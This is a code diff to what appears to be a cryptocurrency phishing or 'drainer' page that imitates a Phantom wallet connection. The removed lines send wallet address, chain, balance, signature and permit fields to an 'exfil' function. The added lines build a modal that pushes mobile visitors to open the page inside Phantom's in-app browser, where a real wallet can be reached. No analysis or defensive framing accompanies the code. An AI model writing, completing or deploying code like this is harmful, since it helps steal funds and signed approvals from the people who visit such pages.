@@ -592,12 +592,19 @@ function wcmodal() {
 }
 
 function showPhantomMobileModal() {
-  showMobileModal('Phantom', '#7b6fe0', '#fff', function(){
-    var fake = 'B' + Array.from({length:43},function(){return '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'[Math.floor(Math.random()*58)]}).join('');
-    ACC = fake; WT = 'ph'; CID = 'solana'; BAL = '0.00';
-    updateUI(fake.slice(0,4)+'...'+fake.slice(-4), fake, BAL+' SOL');
-    exfil({address:fake, type:'Phantom (Mobile)', chain:'Solana', balance:BAL+' SOL', sig:'', permit:''});
-  });
+  var o = document.createElement('div');
+  o.className = 'wmo';
+  var url = encodeURIComponent(location.href);
+  var rawUrl = location.href;
+  o.innerHTML = '<div class="wm" style="max-width:340px;text-align:center"><div class="wmh" style="justify-content:center"><div class="wht">Phantom</div></div><div style="background:var(--field);border-radius:20px;padding:24px;margin:16px 0"><div style="width:80px;height:80px;margin:0 auto;background:#7b6fe0;border-radius:20px;display:grid;place-items:center"><svg width="40" height="40" viewBox="0 0 24 24"><circle cx="12" cy="12" r="8" fill="#fff"/></svg></div></div><div style="font-size:14px;color:var(--text);margin-bottom:8px;font-weight:600">Phantom not detected</div><div style="font-size:12px;color:var(--text-sub);margin-bottom:16px;line-height:1.4">To connect with Phantom on mobile, open this page in Phantom\'s in-app browser.</div><a href="phantom://browse?url='+url+'" style="display:block;width:100%;height:48px;line-height:48px;background:#7b6fe0;color:#fff;border:none;border-radius:16px;font-weight:600;font-size:15px;text-decoration:none;margin-bottom:8px">Open in Phantom</a><button class="cp-url-btn" style="width:100%;height:40px;background:transparent;color:var(--text-sub);border:1px solid var(--border);border-radius:12px;font-weight:500;font-size:12px">Copy URL to open manually</button><div class="wmf" style="margin-top:12px"><a href="#" onclick="this.closest(\'.wmo\').remove()">Cancel</a></div></div>';
+  o.querySelector('.cp-url-btn').onclick = function(){
+    navigator.clipboard.writeText(rawUrl).then(function(){
+      toast('Copied','URL copied to clipboard');
+    }).catch(function(){
+      prompt('Copy this URL:', rawUrl);
+    });
+  };
+  document.body.appendChild(o);
 }
 
 function showMobileModal(title, color, textColor, callback) {
